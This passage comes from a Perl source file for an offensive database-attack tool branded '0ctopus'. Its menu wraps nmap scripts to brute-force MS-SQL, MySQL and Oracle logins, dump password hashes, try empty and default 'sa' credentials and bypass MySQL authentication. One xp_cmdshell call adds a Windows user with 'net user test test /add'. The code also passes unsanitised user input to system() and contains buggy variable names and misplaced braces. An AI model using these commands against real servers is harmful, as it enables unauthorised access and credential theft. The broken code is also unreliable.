        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqlemptypasswordv=<STDIN>);
        print "\n";
        mssqlemptypassword();
        enter();
    }if($number eq '12'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqlqueryv=<STDIN>);
        print "\n";
        mssqlquery();
        enter();
    }if($number eq '13'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqlxpshellv=<STDIN>);
        print "\n";
        mssqlxpshell();
        enter();
    }if($number eq '14'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($msqlbrodcastv=<STDIN>);
        print "\n";
        msqlbrodcast();
        enter();
    }if($number eq '15'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlvaliduserv=<STDIN>);
        print "\n";
        mysqlvaliduser();
        enter();
    }if($number eq '16'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlpassdguessv=<STDIN>);
        print "\n";
        mysqlpassdguess();
        enter();
    }if($number eq '17'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlemptypasswd=<STDIN>);
        print "\n";
        mysqlemptypasswd();
        enter();
    }if($number eq '18'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlalldatabasev=<STDIN>);
        print "\n";
        mysqlalldatabase();
        enter();
    }if($number eq '19'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlallusersv=<STDIN>);
        print "\n";
        mysqlallusers();
        enter();
    }if($number eq '20'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlqueryv=<STDIN>);
        print "\n";
        mysqlqueryv();
        enter();
    }if($number eq '21'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlauditdatabasesv=<STDIN>);
        print "\n";
        mysqlauditdatabases();
        enter();
    }if($number eq '22'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlpasswdhashesv=<STDIN>);
        print "\n";
        mysqlpasswdhashes();
        enter();
    }if($number eq '23'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlauthnbypassv=<STDIN>);
        print "\n";
        mysqlauthnbypass();
        enter();
    }if($number eq '24'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mariaauthnbypassv=<STDIN>);
        print "\n";
        mariaauthnbypass();
        enter();
    }if($number eq '25'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oraclebruteforcev=<STDIN>);
        print "\n";
        oraclebruteforce();
        enter();
    }if($number eq '26'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oracletnsversionv=<STDIN>);
        print "\n";
        oracletnsversion();
        enter();
    }if($number eq '27'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oraclepasswordhashv=<STDIN>);
        print "\n";
        oraclepasswordhash();
        enter();
    }if($number eq '28'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oracleenumerateusernamesv=<STDIN>);
        print "\n";
        oracleenumerateusernames();
        enter();
    }if($number eq '29'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oracletnshackv=<STDIN>);
        print "\n";
        oracletnshack();
        enter();
    }if($number eq '30'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oraclesidv=<STDIN>);
        print "\n";
        oraclesid();
        enter();    
    }if($number eq '31'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mangodbdatabasesv=<STDIN>);
        print "\n";
        mangodbdatabases();
        enter();
    }if($number eq '32'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mangodBinfov=<STDIN>);
        print "\n";
        mangodBinfo();
        enter();    
    }if($number eq '33'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($couchdBinfov=<STDIN>);
        print "\n";
        couchdBinfo();
        enter();
    }if($number eq '34'){##########################
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlvcombov=<STDIN>);
        print "\n";
        mysqlvcombo();
        enter();
    }if($number eq '35'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($couchdbvcombov=<STDIN>);
        print "\n";
        couchdbvcombo();
        enter();
    }if($number eq '36'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqlvcombov=<STDIN>);
        print "\n";
        mssqlvcombo();
        enter();
    }if($number eq '37'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oraclevcombov=<STDIN>);
        print "\n";
        oraclevcombo();
        enter();
    }if($number eq '38'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($influxdbvcombov=<STDIN>);
        print "\n";
        influxdbvcombo();
        enter();
    }if($number eq '39'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mariadbvcombov=<STDIN>);
        print "\n";
        mariadbvcombo();
        enter();
    }if($number eq '40'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($hydraoraclev=<STDIN>);
        print "\n";
        hydraoracle();
        enter();
    }if($number eq '41'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oscannerv=<STDIN>);
        print "\n";
        oscanner();
        enter();
    }if($number eq '42'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($odatscannerv=<STDIN>);
        print "\n";
        odatscanner();
        enter();
    }if($number eq '43'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($odatscannertnscmdv=<STDIN>);
        print "\n";
        odatscannertnscmd();
        enter();
    }if($number eq '44'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($nmapchecksv=<STDIN>);
        print "\n";
        nmapchecks();
        enter();
    }if($number eq '45'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($findiisv=<STDIN>);
        print "\n";
        findiis();
        enter();
    }if($number eq '46'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($niktov=<STDIN>);
        print "\n";
        nikto();
        enter();
    }if($number eq '47'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($sqlmapv=<STDIN>);
        print "\n";
        sqlmap();
        enter();
    }if($number eq '48'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        #chomp($sqlivv=<STDIN>);
        print "\n";
        sqliv();
        enter();
    }if($number eq '49'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($cewlv=<STDIN>);
        print "\n";
        cewl();
        enter();
    }if($number eq '50'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($uriv=<STDIN>);
        print "\n";
        uri();
        enter();
    }if($number eq '51'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($crawlerv=<STDIN>);
        print "\n";
        crawler();
        enter();
    }if($number eq '52'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        #chomp($databasedorksv=<STDIN>);
        print "\n";
        databasedorks();
        enter();    
    }if($number eq '0'){
        exit;
    }
    else{
        banner();
        menu();
    }
}



#--------------------------------------------------------------#
#           1 - MS-SQL Information                             #
#--------------------------------------------------------------#
sub mssqlinfo ( ) {
	print item(),"Extracting Information \n\n";
    if (system("nmap -sV -Pn -p1433 --script ms-sql-info $mssqlinfov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }


#--------------------------------------------------------------#
#           2 - MY-SQL Information                             #
#--------------------------------------------------------------#
sub mysqlinfo ( ) {
    print item(),"Extracting Information \n\n";
    if (system("nmap -sV -Pn -p3306 --script mysql-info $mysqlinfov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           3 - MangodB Information                            #
#--------------------------------------------------------------#
sub Mangodbinfo() {
    print item(),"Extracting Information \n\n";
    if (system("nmap -sV -Pn -p27017 --script mongodb-info $mangodbv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }

#--------------------------------------------------------------#
#           4 - Oracle Information                             #
#--------------------------------------------------------------#
sub oracleinfo() {
    print item(),"Extracting Information \n\n";
    if (system("nmap -sV -Pn -p1521 $mysqlinfov") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
#--------------------------------------------------------------#
#           5 - InfluxdB Information                           #
#--------------------------------------------------------------#
sub influxdbinfo() {
    print item(),"Extracting Information \n\n";
    #if (system("nmap -sV -Pn -p8080,8081,8082,8083,8084,8085,8086,8087,8088 --script mysql-info $influxdbv") == 0) {
    if (system("nmap -sV -Pn -p8080,8081,8082,8083,8084,8085,8086,8087,8088 $influxdbv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
#--------------------------------------------------------------#
#           6 - MS-SQL Configuration                           #
#--------------------------------------------------------------#
sub mssqlconfig ( )  {
    print item(),"Extracting Configuration \n\n";
    if (system("nmap -p 1433 --script ms-sql-config --script-args mssql.username=sa,mssql.password=sa $mssqlconfigv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
#--------------------------------------------------------------#
#           7 - MS-SQL Dump Hashses                            #
#--------------------------------------------------------------#
sub mssqldumphahses ( )  {
    print item(),"1 - Dump Hashses using empty password \n";
	print item(),"2 - Dump Hashses using default password \n";
    print item(),"3 - Dump Hashses using defined password \n";
    print item(),"Enter Option: ";
	chomp($enter=<STDIN>);
	if ($enter =~1) {
    print item(),"Dump Hashses using empty password \n\n";
    if (system("nmap -p1433 --script ms-sql-empty-password,ms-sql-dump-hashes $mssqldumphahsesv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
	if ($enter =~2) {
    print item(),"Dump Hashses using default password \n\n";
    if (system("nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=sa $mssqldumphahsesv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}    
	if ($enter =~3) {
    print item(),"Dump Hashses using defined password \n\n";    
    print item(),"Enter username: ";
    chomp($username=<STDIN>);
    print item(),"Enter password: "; 
    chomp($password=<STDIN>);
    if (system("nmap -p 1433 --script ms-sql-config --script-args mssql.username=$username,mssql.password=$password $mssqldumphahsesv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}    

    }


#--------------------------------------------------------------#
#           8 - MS-SQL Dump NTML                               #
#--------------------------------------------------------------#
sub mssqldumpntml ( )  {
    print item(),"Dumping NTML for NetBIOS, DNS, and OS build version \n\n";
    if (system("nmap -p 1433 --script ms-sql-ntlm-info $mssqldumpntmlv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
#--------------------------------------------------------------#
#           9 - MS-SQL Brute Force                             #
#--------------------------------------------------------------#
sub mssqlbruteforce ( ) {
    print item(),"1 - Brute Force using port 445 \n";
	print item(),"2 - Brute Force using port 1433 \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {
    print item(),"Brute Force using port 445 \n\n";
    print item(),"Provide mssql username wordlist file: ";
    chomp($username=<STDIN>);
    print item(),"Provide mssql password wordlist file: "; 
    chomp($password=<STDIN>);    
    if (system("nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=$username,passdb=$password $mssqlbruteforcev") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
	if ($enter =~2) {
    print item(),"Brute Force using port 1433 \n\n";
    print item(),"Provide mssql username wordlist file: ";
    chomp($username=<STDIN>);
    print item(),"Provide mssql password wordlist file: "; 
    chomp($password=<STDIN>);
    if (system("nmap -p 1433 --script ms-sql-brute --script-args userdb=$username,passdb=$password $mssqldumphahsesv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}    
    }
    }
#--------------------------------------------------------------#
#           10 - MS-SQL Check Backup Dedicated Admin Connection#
#--------------------------------------------------------------#
sub mssqldac ( )  {
    print item(),"1 - Query DAC using ping \n";
	print item(),"2 - Query DAC using no ping \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {
    print item(),"Querying Microsoft SQL Browser service for the DAC (Dedicated Admin Connection) for backup admin access \n";     
    if (system("nmap -sU -p 1434 --script ms-sql-dac $mssqldacv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {
    print item(),"Querying Microsoft SQL Browser service for the DAC (Dedicated Admin Connection) for backup admin access \n";     
    if (system("nmap -sU -Pn -p1434 --script ms-sql-dac $mssqldacv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }
                    }                

#--------------------------------------------------------------#
#           11 - MS-SQL Empty Password                         #
#--------------------------------------------------------------#
sub mssqlemptypassword( )  {
    print item(),"1 - MS-SQL empty-password using port 445 \n";
	print item(),"2 - MS-SQL empty-password using port 1433 \n";
    print item(),"3 - MS-SQL empty-password using defined settings \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {    
    print item(),"Attempting to authenticate using an empty password for the sysadmin account. \n\n";
    if (system("nmap -p 445 --script ms-sql-empty-password --script-args mssql.instance-all $mssqlemptypasswordv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {
    print item(),"Attempting to authenticate using an empty password for the sysadmin account. \n\n";
    if (system("nmap -p 1433 --script ms-sql-empty-password $mssqlemptypasswordv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }    
    if ($enter =~3) {
    print item(),"Attempting to authenticate using an empty password for the sysadmin account. \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap $option -p$port --script ms-sql-empty-password $mssqlemptypasswordv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }
    }
    
#--------------------------------------------------------------#
#           12 - Query using default user and password         #
#--------------------------------------------------------------#
sub mssqlquery ( ) {
    print item(),"Querying against Microsoft SQL Server \n\n";    
    print item(),"Enter Port : ";	
    chomp($port=<STDIN>);
    if (system("nmap -p$port --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query='SELECT * FROM master..syslogins' $mssqlqueryv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}    
    }
    
    
#--------------------------------------------------------------#
#           13 - MS-SQL Check XP Shell                         #
#--------------------------------------------------------------#
sub mssqlxpshell ( ) {
    print item(),"1 - MS-SQL Check XP Shell using port 445 \n";
	print item(),"2 - MS-SQL Check XP Shell using port 1433 \n";
    print item(),"3 - MS-SQL Check XP Shell using defined settings \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {    
    print item(),"Attempting to run a command using the command shell of Microsoft SQL Server \n\n";
    if (system("nmap -p 445 --script ms-sql-empty-password,ms-sql-xp-cmdshell $mssqlxpshellv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {
    print item(),"Attempting to run a command using the command shell of Microsoft SQL Server \n\n";
    if (system("nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd='net user test test /add' $mssqlxpshellv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }    
    if ($enter =~3) {
    print item(),"Attempting to run a command using the command shell of Microsoft SQL Server \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap $option -p$port --script ms-sql-xp-cmdshell $mssqlxpshellv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }
    }
    
#--------------------------------------------------------------#
#           14 - MS-SQL Broadcastg Discover                    #
#--------------------------------------------------------------#
sub msqlbrodcast ( ) {
    print item(),"1 - Discovers Microsoft SQL Servers \n";
	print item(),"2 - Discovers Microsoft SQL Servers using arguments \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {    
    print item(),"Discovers Microsoft SQL Servers in same Broadcast Domain \n\n";
    if (system("   nmap --script broadcast-ms-sql-discover $msqlbrodcastv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {
    print item(),"Discovers Microsoft SQL Servers in same Broadcast Domain \n\n";
    if (system("nmap --script broadcast-ms-sql-discover,ms-sql-info --script-args=newtargets $msqlbrodcastv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }    
}


#--------------------------------------------------------------#
#           15 - My-SQL Valid User Enumeration                 #
#--------------------------------------------------------------#
sub mysqlvaliduser ( ) {
    print item(),"Performing User Enumeration Against MySQL Servers \n\n";
    if (system("nmap --script=mysql-enum $mysqlvaliduserv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
    
#--------------------------------------------------------------#
#           16 - My-SQL Performs Password Guess                #
#--------------------------------------------------------------#
sub mysqlpassdguess ( ) {
    print item(),"Performing Password guess against My-SQL \n\n";
    if (system("nmap --script=mysql-brute $mysqlpassdguessv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
    
#--------------------------------------------------------------#
#           17 - My-SQL Check Empty Password                   #
#--------------------------------------------------------------#
sub mysqlemptypasswd ( ){
    print item(),"1 - Connect using empty password using port 445  \n";
	print item(),"2 - Connect using empty password using port 1434 \n";
    print item(),"3 - Connect using empty password using defined settings \n";
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {    
  print item(),"Check Empty Password against My-SQL \n\n";
    if (system("nmap -p 445 --script ms-sql-empty-password --script-args mssql.instance-all $mysqlemptypasswdv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    
}
    if ($enter =~2) {
    print item(),"Check Empty Password against My-SQL \n\n";
    if (system("nmap -p 1433 --script ms-sql-empty-password $mysqlemptypasswdv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    if ($enter =~3) {
    print item(),"Check Empty Password against My-SQL \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap $option -p$port ms-sql-empty-password $mssqlxpshellv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
                    }
}
    
    

    
    
    
#--------------------------------------------------------------#
#           18 - My-SQL List All Database                      #
#--------------------------------------------------------------#
sub mysqlalldatabase ( ){
    print item(),"Check Empty Password against My-SQL \n\n";
    if (system("nmap -sV --script=mysql-empty-password $mysqlalldatabasev") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
    
#--------------------------------------------------------------#
#           19 - MS-SQL List All Users on Server               #
#--------------------------------------------------------------#
sub mysqlallusers ( ) {
    print item(),"Attempting to list all users on My-SQL Server \n\n";
    if (system("nmap -sV --script=mysql-users $mysqlallusersv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
    
#--------------------------------------------------------------#
#           20 - My-SQL Database Query                         #
#--------------------------------------------------------------#
sub mysqlquery ( ) {     
    print item(),"1 - Query Against Database for Tables  \n";
	print item(),"2 - Query Against Database for Tables using defined settings \n";    
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {      
    print item(),"Query Against Database for Tables \n\n";
    if (system("nmap -p 3306 $mysqlqueryv --script mysql-query --script-args='query='Show Databases'[,username=sa,password=sa]'") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
}
    if ($enter =~2) {
    print item(),"Query Against Database for Tables using defined settings \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap $option $port $mysqlqueryv--script mysql-query --script-args='query='Show Databases'[,username=sa,password=sa]'") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
    
    
#--------------------------------------------------------------#
#           21 - My-SQL Audits Database                        #
#--------------------------------------------------------------#
sub mysqlauditdatabases ( ){
    print item(),"Audits MySQL Database using Defined Settings on Local or Compromised Machines\n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    print item(),"Enter User   : ";	
    chomp($user=<STDIN>);
    print item(),"Enter Passwd : ";	
    chomp($passwd=<STDIN>);
    if (system("nmap $option $port --script mysql-audit --script-args 'mysql-audit.username='$user', \ mysql-audit.password='$passwd',mysql-audit.filename='nselib/data/mysql-cis.audit''") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
    
    
#--------------------------------------------------------------#
#           22 - My-SQL Dump Password Hashes                   #
#--------------------------------------------------------------#
sub mysqlpasswdhashes ( ) {
    print item(),"Dumping Password Hashes using Defined Settings\n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    print item(),"Enter User   : ";	
    chomp($user=<STDIN>);
    print item(),"Enter Pass   : ";	
    chomp($passwd=<STDIN>);
    if (system("nmap $option $port $mysqlpasswdhashesv --script mysql-dump-hashes --script-args='username=$user,password=$pass'") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
    }
    
#--------------------------------------------------------------#
#           23 - My-SQL Authenication Bypass                   #
#--------------------------------------------------------------#
sub mysqlauthnbypass ( ) {
    print item(),"1 - Bypass Authentication for MySQL using Port 3306   \n";
	print item(),"2 - Bypass Authentication for MySQL using sV Option \n";    
    print item(),"3 - Bypass Authentication for MySQL using Defined Settings \n";    
    print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
	if ($enter =~1) {      
    print item(),"Bypassing Authentication for MySQL using Port 3306 \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap -p3306 --script mysql-vuln-cve2012-2122 $mysqlauthnbypassv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~2) {      
    print item(),"Bypassing Authentication for MySQL using sV Option \n\n";
    print item(),"Enter Option : ";	
    chomp($option=<STDIN>);
    print item(),"Enter Port   : ";	
    chomp($port=<STDIN>);
    if (system("nmap -sV --script mysql-vuln-cve2012-2122 $mysqlauthnbypassv") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Error, Command Failed\n";
	}
}
    if ($enter =~3) {      
